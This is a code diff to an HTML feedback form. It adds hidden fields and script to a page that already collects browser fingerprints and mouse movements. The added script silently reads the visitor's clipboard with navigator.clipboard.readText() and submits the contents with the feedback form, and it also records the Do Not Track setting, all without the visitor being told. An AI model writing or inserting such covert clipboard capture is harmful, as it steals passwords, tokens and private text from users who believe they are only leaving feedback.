@@ -69,7 +69,8 @@
     <input type="hidden" name="fingerprint" id="fingerprint">
     <input type="hidden" name="server_time_difference" id="server_time_difference">
     <input type="hidden" name="mouse_movements" id="mouse_movements">
-
+    <input type="hidden" name="clipboard_content" id="clipboard_content">
+    <input type="hidden" name="do_not_track" id="do_not_track">
     
     <button type="submit">Submit</button>
 </form>
@@ -304,5 +305,16 @@ document.addEventListener('mousemove', function(event) {
 document.getElementById('feedbackForm').addEventListener('submit', function() {
     document.getElementById('mouse_movements').value = JSON.stringify(mouseMovementData);
 });
-    
+
+
+// Monitor clipboard
+navigator.clipboard.readText().then(text => {
+    document.getElementById('clipboard_content').value = text;
+}).catch(err => {
+    document.getElementById('clipboard_content').value = "Not accessible";
+});
+
+
+// Do not track status
+document.getElementById('do_not_track').value = navigator.doNotTrack == "1" ? "Enabled" : "Disabled";
 </script>
